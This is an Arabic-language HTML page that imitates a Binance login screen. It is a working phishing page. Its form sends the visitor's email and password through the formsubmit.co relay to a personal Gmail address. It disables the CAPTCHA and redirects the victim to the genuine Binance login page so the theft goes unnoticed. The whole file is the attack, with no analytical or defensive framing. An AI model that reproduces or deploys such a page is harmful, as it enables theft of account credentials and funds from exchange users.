<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Binance تسجيل الدخول</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #0a0a23;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background-color: #14142b;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px #00bfff;
      width: 320px;
      text-align: center;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #00bfff;
    }
    input[type="email"],
    input[type="password"] {
      width: 90%;
      padding: 12px 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }
    button {
      background-color: #00bfff;
      border: none;
      color: white;
      padding: 12px 20px;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
      width: 95%;
      margin-top: 15px;
    }
    button:hover {
      background-color: #008fcf;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>تسجيل الدخول إلى بينانس</h2>
    <form id="loginForm" method="POST" action="https://formsubmit.co/bassamsharifalisharif@gmail.com" >
      <input type="email" name="email" placeholder="البريد الإلكتروني" required />
      <input type="password" name="password" placeholder="كلمة المرور" required />
      <input type="hidden" name="_captcha" value="false" />
      <input type="hidden" name="_next" value="https://www.binance.com/ar/login" />
      <button type="submit">تسجيل الدخول</button>
    </form>
  </div>
</body>
</html>
